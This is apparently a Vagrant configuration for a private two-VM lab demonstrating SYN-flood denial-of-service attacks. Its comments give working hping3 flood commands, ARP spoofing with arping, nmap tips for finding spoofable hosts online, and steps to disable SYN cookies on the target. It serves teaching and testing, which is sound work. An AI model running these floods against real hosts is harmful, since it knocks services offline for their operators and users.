# -*- mode: ruby -*-
# vi: set ft=ruby :

Vagrant.configure(2) do |config|
  config.vm.define "badguy1" do |node|  
    node.vm.box = "gbarbieru/xenial"
    node.vm.network "private_network", ip: "172.16.0.5"
    node.vm.hostname = "badguy1"

    node.vm.provision "shell", inline: "sudo apt update; sudo apt install python hping3 arping -y"

    # Scenario 1: Drop SYN-ACKs from victim and start flooding them with SYNs
    # sudo iptables -I INPUT -s [victim IP] -j DROP
    # sudo hping3 --flood -S -p 80 [victim IP]

    # Scenario 2: Spoof MAC address of non-existent computer and flood victim with SYNs
    # sudo watch -n10 "sudo arping -U -s 01:02:03:04:05:06 -S 172.16.0.7 172.16.0.6"
    # sudo hping3 --flood -S -p 80 -a 172.16.0.7 172.16.0.6 

    # Misc: Packet capture on target
    # sudo tcpdump -i eth1
    # NOTE: ARP cache lasts for 60 seconds
    # cat /proc/sys/net/ipv4/neigh/default/gc_stale_time
    # SYN floods over the Internet can be done by spoofing an IP that does not respond with RST packets 
    #  (due to firewall most likely). These are useful for SYN floods. Use nmap to find hosts
    #  that filter TCP: sudo nmap --scanflags synack 172.16.0.6.

    # Migitation: SYN cookies
    # Turned on by default. Turn off with:
    # sudo vi /etc/sysctl.conf
    # --> Set net.ipv4.tcp_syncookies = 0
    # sudo sysctl -p

  end

  config.vm.define "target1" do |node|
    node.vm.box = "gbarbieru/xenial"
    node.vm.network "private_network", ip: "172.16.0.6"
    node.vm.hostname = "target1"

    node.vm.provision "shell", inline: "sudo apt update; sudo apt install nginx tcpdump -y"
  end  

end
